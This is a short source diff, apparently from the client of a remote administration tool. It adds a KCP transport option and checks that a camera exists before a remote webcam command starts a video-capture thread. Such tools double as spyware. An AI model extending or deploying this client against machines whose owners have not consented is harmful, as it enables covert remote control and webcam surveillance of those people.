@@ -14,15 +14,19 @@
 #include "server/2015Remote/pwd_gen.h"
 #include <common/iniFile.h>
 #include "IOCPUDPClient.h"
+#include "IOCPKCPClient.h"
 
 // UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_disconnect) {
-	if (conn->protoType == PROTO_TCP)
+	if (!conn->IsVerified() || conn->protoType == PROTO_TCP)
 		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeNone, conn->GetHeaderEncType());
 	if (conn->protoType == PROTO_UDP)
 		return new IOCPUDPClient(bExit, exit_while_disconnect);
 	if (conn->protoType == PROTO_HTTP)
 		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeHTTP, conn->GetHeaderEncType());
+	if (conn->protoType == PROTO_KCP) {
+		return new IOCPKCPClient(bExit, exit_while_disconnect);
+	}
 	return NULL;
 }
 
@@ -421,6 +425,8 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_WEBCAM:
 		{
+			static bool hasCamera = WebCamIsExist();
+			if (!hasCamera) break;
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
